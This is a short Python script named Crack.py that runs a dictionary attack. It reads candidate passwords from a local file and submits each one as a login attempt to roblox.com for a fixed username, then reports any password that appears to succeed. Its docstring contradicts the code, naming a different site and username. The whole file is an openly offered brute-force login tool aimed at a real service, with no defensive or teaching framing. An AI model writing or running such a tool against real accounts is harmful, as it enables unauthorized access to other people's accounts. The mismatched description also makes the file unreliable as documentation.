#!/usr/bin/env python3
"""
Crack.py

Reads an existing passwords.txt file in the same directory and attempts login
on https://exaroton.com/go/ for the fixed username "barbute". No interactive prompts.
"""
import requests
from pathlib import Path

def main():
    print("Start cracking...")

    url = 'https://roblox.com/login'
    username = 'TESTCRAC123459'
    pw_file = Path(__file__).parent / 'passwords.txt'

    if not pw_file.exists():
        print(f"Error: Password file not found: {pw_file}")
        return

    success_found = False
    with pw_file.open('r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            pwd = line.strip()
            if not pwd:
                continue
            try:
                res = requests.post(url, data={'username': username, 'password': pwd}, timeout=5)
                status = res.status_code
            except requests.RequestException as e:
                print(f"Error trying {pwd}: {e}")
                continue

            print(f"Trying {pwd}: status={status}")

            # Detect success via explicit keyword 'success'
            if status == 200 and 'success' in res.text.lower():
                print(f"Success! The password is: {pwd}")
                success_found = True
                break

    if not success_found:
        print("All passwords tried; no success detected.")

if __name__ == '__main__':
    main()
